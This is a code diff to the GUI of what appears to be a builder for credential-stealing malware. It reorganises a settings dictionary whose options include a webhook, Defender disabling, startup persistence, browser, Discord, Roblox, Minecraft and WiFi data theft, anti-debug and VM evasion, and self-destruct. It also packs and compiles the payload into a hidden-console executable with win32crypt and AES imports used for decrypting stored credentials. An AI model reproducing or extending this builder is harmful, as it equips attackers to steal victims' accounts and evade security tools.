@@ -36,6 +36,28 @@ class App(customtkinter.CTk):
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
         self.dark_mode()
+        
+        self.updated_dictionary = {
+            "webhook": None,
+            "ping": False,
+            "pingtype": None,
+            "error": False,
+            "startup": False,
+            "defender": False,
+            "systeminfo": False,
+            "backupcodes": False,
+            "browser": False,
+            "roblox": False,
+            "obfuscation": False,
+            "injection": False,
+            "minecraft": False,
+            "wifi": False,
+            "killprotector": False,
+            "antidebug_vm": False,
+            "discord": False,
+            "anti_spam": False,
+            "self_destruct": False
+        }
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
         self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
@@ -305,28 +327,6 @@ class App(customtkinter.CTk):
                             font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
 
     def update_config(self, event):
-        self.updated_dictionary = {
-            "webhook": None,
-            "ping": False,
-            "pingtype": None,
-            "error": False,
-            "startup": False,
-            "defender": False,
-            "systeminfo": False,
-            "backupcodes": False,
-            "browser": False,
-            "roblox": False,
-            "obfuscation": False,
-            "injection": False,
-            "minecraft": False,
-            "wifi": False,
-            "killprotector": False,
-            "antidebug_vm": False,
-            "discord": False,
-            "anti_spam": False,
-            "self_destruct": False
-        }
-
         checkbox_mapping = {
             "webhook": self.webhook_button,
             "ping": self.ping,
@@ -420,12 +420,15 @@ class App(customtkinter.CTk):
 
     @catcher
     def compile_file(self, filename):
+        os.system("python ./tools/upx.py")
+        
         if self.iconpath is None:
             exeicon = "NONE"
         else:
             exeicon = self.iconpath
 
-        os.system(f"python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threading --hidden-import shutil.copy2 --hidden-import argv --hidden-import zipfile.ZIP_DEFLATED --hidden-import zipfile.ZipFile --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --hidden-import win32crypt.CryptUnprotectData --icon {exeicon} .\\{filename}.py")
+        os.system(
+            f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
 
 
     def cleanup_files(self, filename):
